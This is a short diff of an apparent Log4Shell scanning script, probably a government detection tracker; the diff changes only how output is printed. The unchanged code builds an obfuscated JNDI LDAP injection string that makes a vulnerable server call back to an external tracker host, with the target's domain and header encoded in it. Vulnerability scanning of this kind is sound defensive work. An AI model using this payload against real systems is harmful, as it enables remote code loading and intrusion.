@@ -30,7 +30,7 @@ SERVERLIST = os.getenv("NATS_SERVERS")
 SERVERS = SERVERLIST.split(",")
 
 def to_json(msg):
-    print(json.dumps(msg, indent=2))
+    print(json.dumps(msg))
 
 def randomword(length):
     letters = string.ascii_lowercase
@@ -40,7 +40,7 @@ def payload(domain, header):
     hashed_domain = hashlib.md5(domain.encode('utf-8')).hexdigest()
     encoded_header = base64.b64encode(header.encode('utf-8')).decode('utf-8').rstrip('=')
     payload = "${${::-j}${::-n}${lower:D}i:l${::-d}${::-a}${lower:P}://" + f"{hashed_domain}.{encoded_header}" + ".t.log4shell.tracker.alpha.canada.ca}"
-    print({'domain': domain, 'header': header, 'payload': payload})
+    to_json({'domain': domain, 'header': header, 'payload': payload})
     return payload
 
 def log4shell(domain):
